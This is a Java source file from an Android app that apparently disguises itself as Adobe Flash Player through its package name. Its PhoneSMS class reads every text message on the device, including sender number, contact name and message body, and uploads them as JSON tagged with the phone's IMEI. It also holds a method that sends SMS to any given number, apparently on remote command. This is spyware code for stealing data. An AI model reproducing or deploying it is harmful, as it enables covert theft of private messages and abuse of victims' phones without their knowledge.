package com.adobe.flashplayer.data;

import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.Public;



public class PhoneSMS {

    private static final String TAG = "[ljg]PhoneSMS";

    public static boolean getSmsFromPhone(Context context) {

        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.READ_SMS);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                ContentResolver cr = context.getContentResolver();
                String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
                Cursor cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc");
                if (null == cur) {
                    return false;
                }

                JSONArray jsarray = new JSONArray();
                int i = 0;
                for (cur.moveToFirst(); !cur.isAfterLast(); cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex("_id"));
                    String address = cur.getString(cur.getColumnIndex("address"));
                    String person = cur.getString(cur.getColumnIndex("person"));
                    String body = cur.getString(cur.getColumnIndex("body"));
                    String date = cur.getString(cur.getColumnIndex("date"));
                    String type = cur.getString(cur.getColumnIndex("type"));

                    String strdate = Utils.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));
                    JSONObject jsobj = new JSONObject();
                    jsobj.put("ID", id);
                    jsobj.put("号码", address);
                    jsobj.put("名称", person);
                    jsobj.put("消息内容", body);
                    jsobj.put("时间", strdate);
                    jsobj.put("类型", type);
                    jsarray.put(i, jsobj);
                    i++;
                }
                cur.close();

                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,
                        Public.CMD_DATA_MESSAGE, Public.IMEI);
                return true;
            }
        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getSmsFromPhone exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
        return false;
    }



    public static void sendMessage(Context context,String phoneNumber, String message) {
        try{
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.SEND_SMS);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                SmsManager smsManager = SmsManager.getDefault();
                PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
                if (message.length() > 70) {
                    List<String> msgs = smsManager.divideMessage(message);
                    for (String msg : msgs) {
                        smsManager.sendTextMessage(phoneNumber, null, msg, sentIntent, null);
                    }
                } else {
                    smsManager.sendTextMessage(phoneNumber, null, message, sentIntent, null);
                }

                Log.e(TAG, "send short message:" + phoneNumber + " ok");
                MyLog.writeLogFile("send short message:" + phoneNumber + " ok\r\n");
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("sendShortMessage exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }



}
